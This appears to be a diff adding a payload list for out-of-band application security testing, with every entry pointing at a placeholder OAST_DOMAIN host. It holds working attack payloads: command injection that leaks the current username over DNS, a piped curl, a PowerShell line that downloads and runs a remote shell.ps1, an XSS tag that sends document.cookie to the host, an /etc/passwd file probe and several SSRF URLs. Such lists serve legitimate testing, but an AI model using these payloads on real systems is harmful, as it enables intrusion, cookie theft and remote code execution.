@@ -1,0 +1,10 @@
+; nslookup $(whoami).OAST_DOMAIN
+$(ping -c 1 OAST_DOMAIN)
+http://OAST_DOMAIN
+file:///OAST_DOMAIN/etc/passwd
+| curl http://OAST_DOMAIN/
+powershell IEX(New-Object Net.WebClient).DownloadString('http://OAST_DOMAIN/shell.ps1')
+<img src="http://OAST_DOMAIN/xss" onerror="fetch('http://OAST_DOMAIN/?x='+document.cookie)">
+https://OAST_DOMAIN/callback
+ftp://OAST_DOMAIN/
+smtp://OAST_DOMAIN/
